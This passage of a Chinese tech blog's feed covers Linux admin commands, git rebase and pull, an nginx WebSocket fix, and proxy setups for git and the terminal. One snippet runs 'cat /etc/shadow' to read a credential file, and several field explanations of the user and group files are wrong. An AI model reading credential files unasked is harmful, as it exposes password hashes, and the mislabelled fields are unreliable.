统计信息，它可以显示和netstat 类似的内容。但ss 的优势在于它能够显示更多更详细的有关TCP 和连接状态的信息，而且比netstat 更快速更高效。</p><p>显示所有的tcp 套接字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -t -a</span><br></pre></td></tr></table></figure><p>显示Socket 摘要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -s</span><br></pre></td></tr></table></figure><p>列出所有打开的网络连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -l</span><br></pre></td></tr></table></figure><p>找出打开套接字/端口应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ss -pl | grep 6666</span><br></pre></td></tr></table></figure><h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><p>存放用户信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;passwd</span><br><span class="line">$ cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p>用户信息文件分析（每项用:隔开）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jack:X:503:504:::&#x2F;home&#x2F;jack&#x2F;:&#x2F;bin&#x2F;bash</span><br><span class="line">jack　　&#x2F;&#x2F;用户名</span><br><span class="line">X　　&#x2F;&#x2F;口令、密码</span><br><span class="line">503　　&#x2F;&#x2F;用户id（0代表root、普通新建用户从500开始）</span><br><span class="line">504　　&#x2F;&#x2F;所在组</span><br><span class="line">:　　&#x2F;&#x2F;描述</span><br><span class="line">&#x2F;home&#x2F;jack&#x2F;　　&#x2F;&#x2F;用户主目录</span><br><span class="line">&#x2F;bin&#x2F;bash　　&#x2F;&#x2F;用户缺省Shell</span><br></pre></td></tr></table></figure><p>存放组信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;group</span><br><span class="line">cat &#x2F;etc&#x2F;gshadow</span><br></pre></td></tr></table></figure><p>用户组信息文件分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jack:$!$:???:13801:0:99999:7:*:*:</span><br><span class="line">jack　　&#x2F;&#x2F;组名</span><br><span class="line">$!$　　&#x2F;&#x2F;被加密的口令</span><br><span class="line">13801　　&#x2F;&#x2F;创建日期与今天相隔的天数</span><br><span class="line">0　　&#x2F;&#x2F;口令最短位数</span><br><span class="line">99999　　&#x2F;&#x2F;用户口令</span><br><span class="line">7　　&#x2F;&#x2F;到7天时提醒</span><br><span class="line">*　　&#x2F;&#x2F;禁用天数</span><br><span class="line">*　　&#x2F;&#x2F;过期天数</span><br></pre></td></tr></table></figure><p>如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改boo 用户的密码</span><br><span class="line">$ passwd boo</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://www.cnblogs.com/peida/archive/2013/03/18/2965369.html#4235146" target="_blank" rel="noopener">Wget 命令</a></li><li><a href="http://man.linuxde.net/scp" target="_blank" rel="noopener">SCP 命令</a></li><li><a href="http://man.linuxde.net/last" target="_blank" rel="noopener">last 命令</a></li><li><a href="http://man.linuxde.net/who" target="_blank" rel="noopener">who 命令</a></li><li><a href="http://man.linuxde.net/pkill" target="_blank" rel="noopener">pkill 命令</a></li><li><a href="http://man.linuxde.net/ss" target="_blank" rel="noopener">ss 命令</a></li><li><a href="https://blog.csdn.net/kinggaiwusi/article/details/76919854" target="_blank" rel="noopener">permission denied,please try again</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记的目的是记录那些不太常用但却很实用的 Linux 命令。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Linux Commands" scheme="https://www.0x2beace.com/tags/Linux-Commands/"/>
    
  </entry>
  
  <entry>
    <title>Git 变基命令详解</title>
    <link href="https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/"/>
    <id>https://www.0x2beace.com/detailed-explanation-of-git-rebase-commands/</id>
    <published>2020-08-24T12:06:20.000Z</published>
    <updated>2020-08-25T12:10:32.469Z</updated>
    
    <content type="html"><![CDATA[<p>“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><p>问题描述：有时候我们在本地提交完代码，下一个操作是需要推送到远程仓库，这时如果远程仓库已经有了更新的提交，那么当我们执行完<code>git push</code> 命令之后，不出意外会出现以下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: failed to push some refs to &#39;git@gitlab.com:invest2&#x2F;invest_home.git&#39;</span><br><span class="line">hint: Updates were rejected because the remote contains work that you do</span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., &#39;git pull ...&#39;) before pushing again.</span><br><span class="line">hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure><p>这时错误的意思是：推送失败，你需要先将远程仓库最新的提交更新到本地仓库，然后才能 <code>git push</code>。</p><p>所以这个时候你有两个选择：</p><ol><li>使用<code>git pull</code> 自动合并</li><li>使用<code>git fetch</code> 手动合并</li></ol><p>前者虽然用起来很方便，但是自动合并会留下一次合并记录，类似这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Merge branch &#39;master&#39; of bitbucket.org:maxt2013&#x2F;invest_home</span><br></pre></td></tr></table></figure><p>虽然这并不会影响什么，但如果你很重视 <code>commit logs</code>，那么这样的一次记录，是不被容忍的。</p><p>后者通过手动合并，确实可以做到没有多余的合并记录，但是每次手动合并有比较麻烦，那么有没有什么折中的方式，既可以不留下多余的记录，有比较省事。</p><p>答案是有的，它就是我们下面要介绍的“变基”。</p><h2 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h2><p>下面这条命令会将远程仓库中最新的提交合并到本地仓库，<code>--rebase</code>参数的作用是先取消 commit 记录，并把它们临时保存为补丁（patch），这些补丁放在 <code>.git/rebase</code>目录中，等远程仓库同步至本地之后，最后才将补丁合并到本地仓库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>下面用图来解释具体发生了什么。</p><p><code>git pull</code> 之前的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134641.png" alt=""></p><p>使用 <code>git pull --rebase origin</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134808.png" alt=""></p><p>最后使用 <code>git push</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200823134934.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>如果你对 <code>commit logs</code>有强烈的控制欲望，那么变基命令是适合你的，如果你是使用git 的新手，或者你不在意 <code>commit logs</code>，那么直接使用 <code>git pull</code> 自动合并就好了。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/MBuger/article/details/70197532" target="_blank" rel="noopener">git push错误failed to push some refs to的解决</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;“变基”命令是git 常用命令中，比较冷门的，一方面是因为这个命令比较“危险”，如果用不好，很有可能会导致代码丢失。另一方面是因为这个命令不像 add、commit、pull、push 属于必须要执行的命令，就算不用它，也能干活。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Socket.io 连接异常：Error during WebSocket handshake Unexpected response code 400</title>
    <link href="https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/"/>
    <id>https://www.0x2beace.com/socket-io-connection-exception-error-during-webSocket-handshake-unexpected-response-code-400/</id>
    <published>2020-08-23T02:34:50.000Z</published>
    <updated>2020-08-23T02:43:00.235Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间线上的生产环境遇到一个问题：<code>Error during WebSocket handshake: Unexpected response code: 400</code>。</p><p>起初我没太在意，以为就是正常的 <code>socket.io</code> 连接断开了。</p><p>直到我发现 <code>socker.io</code> 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。</p><a id="more"></a><h2 id="nginx-作为wbsocket-代理"><a href="#nginx-作为wbsocket-代理" class="headerlink" title="nginx 作为wbsocket 代理"></a>nginx 作为wbsocket 代理</h2><p>经过一番查找，了解到 nginx 在作为反向代理时，如果需要使用 <code>wss</code>，那么还需要额外加一段配置。</p><blockquote><p>NGINX supports WebSocket by allowing a tunnel to be set up between a client and a backend server. For NGINX to send the Upgrade request from the client to the backend server, the Upgrade and Connection headers must be set explicitly.  —— Nginx 官网</p></blockquote><p>翻译过来就是：nginx 通过允许在客户端和后端服务器之间建立连接来支持 websocket 通讯，为了使 nginx 将升级请求从客户端发送到后端服务器，必须明确设置 Upgrade 和 Connection 标头。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">  proxy_pass http:&#x2F;&#x2F;wsbackend;</span><br><span class="line">  </span><br><span class="line">  proxy_http_version 1.1;</span><br><span class="line">  proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">  proxy_set_header Connection &quot;Upgrade&quot;;</span><br><span class="line">  proxy_set_header Host $host;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行是 nginx 反向代理的配置，后面四行才是这个问题的解决方案。</p><p>仔细想一想，因为本地没有 https 的概念，并没有发现这个问题，而线上是有配置证书的，所以暴露出了这个问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>socket.io</code> 的请求并没有真正达到，请求发出之后中间为什么没有到达节点，这个是解决问题的关键。</p><p>为了使 nginx 正确处理 <code>socket.io</code> 所需要做的就是正确设置标头，以处理将连接从 http 升级到 websocket 的请求。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.nginx.com/blog/websocket-nginx/" target="_blank" rel="noopener">Nginx 作为Websocket 反向代理</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前段时间线上的生产环境遇到一个问题：&lt;code&gt;Error during WebSocket handshake: Unexpected response code: 400&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;起初我没太在意，以为就是正常的 &lt;code&gt;socket.io&lt;/code&gt; 连接断开了。&lt;/p&gt;
&lt;p&gt;直到我发现 &lt;code&gt;socker.io&lt;/code&gt; 的通讯方式由原来的在一个连接中通讯变成了每一次推送都重起一个请求，我才意识到可能是哪里出问题了。&lt;/p&gt;</summary>
    
    
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/categories/Socket-io/"/>
    
    <category term="Nginx" scheme="https://www.0x2beace.com/categories/Socket-io/Nginx/"/>
    
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
    <category term="Socket.io" scheme="https://www.0x2beace.com/tags/Socket-io/"/>
    
    <category term="wss" scheme="https://www.0x2beace.com/tags/wss/"/>
    
  </entry>
  
  <entry>
    <title>Git Clone 太慢怎么办？</title>
    <link href="https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/"/>
    <id>https://www.0x2beace.com/what-should-I-do-if-git-clone-is-too-slow/</id>
    <published>2020-08-19T14:29:15.000Z</published>
    <updated>2020-09-08T01:31:21.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在使用git 时，需要克隆<code>Bitbucket</code>的一个仓库，于是像往常一样打开了<code>iTerm</code>，便放在一边了。<br>直到一个小时后，我才想起来，想着应该克隆完了，打开才发现百分之一都没下载完。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908092611.png" alt="git clone 失败"></p><p>强大的长城技术对GitHub、Bitbucket 这类源代码托管服务平台网开一面，并没有像Google、FaceBook那样直接一刀切，但是它做了严格的限速，这种折磨简直比无法访问更难受。</p><p>上图中<code>git clone</code>的速度从来没有超过 <code>10k/s</code>，这也就意味着一个 <code>100M</code> 的项目，需要近三个小时才能下载完，而且由于网络的不稳定性，下载过程中偶尔会出现断开连接的情况，由于<code>git clone</code> 不支持端点续传，这就会导致前几个小时的下载量完全浪费掉了，只能重新开始下载。</p><p>这篇文章主要用来介绍几种方式可以快速的克隆远程仓库。</p><h3 id="浅复制"><a href="#浅复制" class="headerlink" title="浅复制"></a>浅复制</h3><p><code>git clone</code>默认会下载项目的完整历史版本，如果你只关心代码，而不关心历史信息，那么可以使用 git 的浅复制功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --depth&#x3D;1 https:&#x2F;&#x2F;github.com&#x2F;bcit-ci&#x2F;CodeIgniter.git</span><br></pre></td></tr></table></figure><p><code>--depth=1</code> 表示只下载最近一次的版本，使用浅复制可以大大减少下载的数据量，例如，CodeIgniter 项目完整下载有近 100MiB ，而使用浅复制只有 5MiB 多，这样即使在恶劣的网络环境下，也可以快速的获得代码。</p><p>如果之后又想获取完整历史信息，可以使用下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch --unshallow</span><br></pre></td></tr></table></figure><p>或者，如果你只想下载最新的代码，你也可以直接从远程仓库下载打包好的<code>zip</code>文件，这会比浅复制更快，因为它只包含了最新的代码文件，而且<code>zip</code>是压缩文件。但是很显然，使用浅复制会灵活一些。</p><h3 id="GUI-工具"><a href="#GUI-工具" class="headerlink" title="GUI 工具"></a>GUI 工具</h3><p>如果你有幸正在使用代理，懂得如何科学上网的话，那么访问<code>GitHub</code>、<code>Bitbucket</code>对你来说应该不在话下。</p><p>从源代码托管服务平台下载项目最简单的方法就是使用一款图形化界面（<code>GUI</code>）的Git工具。</p><p>使用<code>GUI</code>工具方便之处就在于，可以在设置中直接配置是否使用代理。或者直接将代理配置尾系统代理。</p><h3 id="http-https-proxy"><a href="#http-https-proxy" class="headerlink" title="http/https proxy"></a>http/https proxy</h3><p>如果你跟我一样，更喜欢使用原生的<code>git</code>命令，喜欢使用在命令行下操作的那种感觉，那么你也可以在命令行下直接配置代理。</p><p>这里也有两种方式，根据实际情况自行选择。</p><h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global http.proxy http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">$ git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1087</span><br></pre></td></tr></table></figure><p>或者直接编辑<code>~/.gitconifg</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.gitconfig</span><br><span class="line"></span><br><span class="line">[http]</span><br><span class="line">proxy &#x3D; http:&#x2F;&#x2F;127.0.0.1:1087</span><br><span class="line">[https]</span><br><span class="line">proxy &#x3D; https:&#x2F;&#x2F;127.0.0.1:1087</span><br></pre></td></tr></table></figure><h4 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086</span><br><span class="line">$ git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1086</span><br></pre></td></tr></table></figure><p>其中，<code>1087</code>、<code>1086</code>分别是你本地机器的 <code>http</code>、<code>socks5</code>代理的端口号。 </p><p>另外，如果想取消设置，可以输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global --unset http.proxy</span><br><span class="line">$ git conifg --global --unset https.proxy</span><br></pre></td></tr></table></figure><p>配置完成后，重新 <code>clone</code>一遍，可以看到速度得到了极大的提升。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200908092634.png" alt="git clone 成功"></p><blockquote><p>注意⚠️</p></blockquote><p>上面这种配置方式仅适用于 <code>https</code>协议，如果你在<code>clone</code>时选择<code>ssh</code>协议，那么速度仍然会很慢。</p><h3 id="替换域名"><a href="#替换域名" class="headerlink" title="替换域名"></a>替换域名</h3><p>如果你觉得上面的方式太麻烦了，或者是你没有代理，那么可以试试下面这种方式。</p><p>这种方式简单暴力，替换就可以直接使用，使用规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 原地址</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;996icu&#x2F;996.ICU.git</span><br><span class="line"></span><br><span class="line"># 替换成</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;996icu&#x2F;996.ICU.git</span><br></pre></td></tr></table></figure><p>只需要在<code>github.com</code>后面追加一个<code>.cnpmjs.org</code>就可以了。</p><p>以上就是<code>git clone</code>太慢时的各种解决办法。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.aneasystone.com/archives/2015/08/git-clone-faster.html" target="_blank" rel="noopener">Git Clone 太慢怎么办？</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在使用git 时，需要克隆&lt;code&gt;Bitbucket&lt;/code&gt;的一个仓库，于是像往常一样打开了&lt;code&gt;iTerm&lt;/code</summary>
      
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Git/Skill/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
  </entry>
  
  <entry>
    <title>如何让终端命令走代理？</title>
    <link href="https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/"/>
    <id>https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/</id>
    <published>2020-08-18T15:39:58.000Z</published>
    <updated>2020-08-18T15:43:24.093Z</updated>
    
    <content type="html"><![CDATA[<p>问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完<code>brew updata</code> 之后，就一直是<code>Updating Homebrew...</code></p><a id="more"></a><p>这个时候，我产生了几个疑问：</p><ol><li>为什么卡着不动了，明明是有网络的啊。</li><li>难道是因为Homebrew 需要访问国外的源？</li><li>Shadowsocks 明明是开着全局代理，为什么没有用？</li><li>如何让终端命令走代理，或者说如何让 Homebrew 走代理更新？</li></ol><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>首先先回答一下上面那些问题，因为国内网络环境进一步恶劣，使得从根本上造成了这个问题的产生。因为<code>Shadowshocks</code>的全局代理虽然对浏览器是有效，但对命令行无效。</p><p>所以这一切的问题可以总结成一个问题：如果能让终端命令走代理就好了。</p><p>好在Homebrew 是支持全局代理的，所以我们只需要在当前环境中加入代理配置就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1080 是本地 socks5 监听端口</span><br></pre></td></tr></table></figure><blockquote><p>如何知道终端命令有没有走代理？</p></blockquote><p>有一个很简单的方法，那就是通过Curl 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure><p>如果走了本地代理，那么很快终端就会有输出，如果没有走则会提示403 端口请求超时。</p><h3 id="永久生效"><a href="#永久生效" class="headerlink" title="永久生效"></a>永久生效</h3><p>需要注意的是，上面的配置仅仅只是临时的，如果重启一下终端，这个配置就失效了，那么有没有办法可以永久生效呢？</p><p>当然是有的，只需要将环境变量写入终端中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># bash</span><br><span class="line">echo export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile</span><br><span class="line"></span><br><span class="line"># zsh</span><br><span class="line">echo export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zsh_profile</span><br></pre></td></tr></table></figure><p>这样，Homebrew 就能通过 <code>Shadowsocks</code> 来更新了。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://www.logcg.com/archives/1617.html" target="_blank" rel="noopener">让 Homebrew 走代理更新</a></li><li><a href="https://www.cnblogs.com/xjnotxj/p/7478614.html" target="_blank" rel="noopener">如何让Homebrew 走代理更新？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完&lt;code&gt;brew updata&lt;/code&gt; 之后，就一直是&lt;code&gt;Updating Homebrew...&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Git Pull 命令详解</title>
    <link href="https://www.0x2beace.com/detailed-git-pull-command/"/>
    <id>https://www.0x2beace.com/detailed-git-pull-command/</id>
    <published>2020-08-17T15:34:26.000Z</published>
    <updated>2020-08-17T15:36:38.472Z</updated>
    
    <content type="html"><![CDATA[<p>这片文章主要用来讲解<code>git pull</code>命令的一些细节。</p><a id="more"></a><h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><p>git pull 的作用是：取回远程主机某个分支的更新，再与本地指定分支自动合并。</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>将远程主机中的更改合并到当前分支，在默认情况下<code>git pull</code>是<code>git fetch</code>命令和<code>git merge Fetch_HEAD</code>命令的合集，后面会详细介绍。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>这是git pull 的完整格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;…]]</span><br></pre></td></tr></table></figure><p>比如要取回<code>origin</code>主机的<code>fixbug</code>分支的最新提交，<strong>并与本地的<code>master</code>分支合并</strong>，就需要写成这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin fixbug:master</span><br></pre></td></tr></table></figure><p>如果远程分支要与当前分支合并，则冒号及其冒号后的分支可以省略，就变成了这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 取回firebug 分支的最新提交并与当前分支合并</span><br><span class="line">$ git pull origin fixbug</span><br></pre></td></tr></table></figure><p>上面的命令表示，取回<code>origin/fixbug</code>分支最新的提交，并于当前分支合并。</p><p>这里就等同于先<code>git fetch</code>获取所跟踪的远程分支的最新的提交，然后执行<code>git merge</code>合并到当前分支。也就是下面两条命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 自动从当前分支的跟踪分支上获取最新的提交</span><br><span class="line">$ git fetch </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 合并origin&#x2F;fixbug分支到当前分支</span><br><span class="line">$ git merge origin&#x2F;fixbug</span><br></pre></td></tr></table></figure><h2 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h2><blockquote><p>为什么这个分支是这种写法?</p></blockquote><p>因为<code>git fetch</code>命令会获取当前追踪分支的最新更改，就等同于取回<code>origin/fixbug</code>分支到本地。</p><p>你可以使用<code>git branch -a</code> 查看所有分支，会发现多了一个 <code>origin/fixbug</code>分支，前提是该分支已经建立了追踪关系。</p><p>而这个分支所包含的内容就是最新的提交或者其他某些更改。所以此时你需要通过合并这个长的比较奇怪的分支，来更新本地的工作区。</p><p>在某些场合，Git 会自动在本地分支与远程分支之间建立一种追踪关系（tracking）。比如，我们在clone 时，会发现所有本地分支默认与远程主机的同名分支，建立追踪关系。也就是说，本地的 master 分支自动追踪 <code>origin/master</code>分支。</p><p>Git 也允许手动添加追踪关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 本地master分支与取回origin&#x2F;fixbug分支建立关系。</span><br><span class="line">$ git branch --set-upstream master origin&#x2F;fixbug</span><br></pre></td></tr></table></figure><p>如果当前分支与远程分支存在追踪关系。那么git pull 就可以省略远程分支名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin</span><br></pre></td></tr></table></figure><p>上面的分支是什么意思呢？就是表示本地的当前分支会自动与对应的<code>origin</code>主机的“追踪分支”进行合并。</p><p>如果当前分支只对应一种追踪分支，那么远程主机名都可以省略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 这也就成了我们常看见的原始命令。</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><p>上面的命令会自动的与唯一的追踪分支进行合并。</p><blockquote><p>如何将远程分支作为本地的默认分支？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt;</span><br></pre></td></tr></table></figure><p>这样就将远程的分支与本地同名分支建立了追踪关系。</p><p>可以使用<code>git config -e</code>命令查看。</p><p>当追踪关系只有一个时，那么使用<code>git pull</code> 命令，就可以直接更新<code>&lt;remote branch&gt;</code> 分支了。</p><p>如果合并需要采用<code>rebase</code>模式，可以使用<code>--rebase</code>选项。</p><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><blockquote><p>这里说一个题外话，<code>rebase</code> 是什么？有什么用？</p></blockquote><p><code>git rebase</code> 清除本地历史提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --rebase 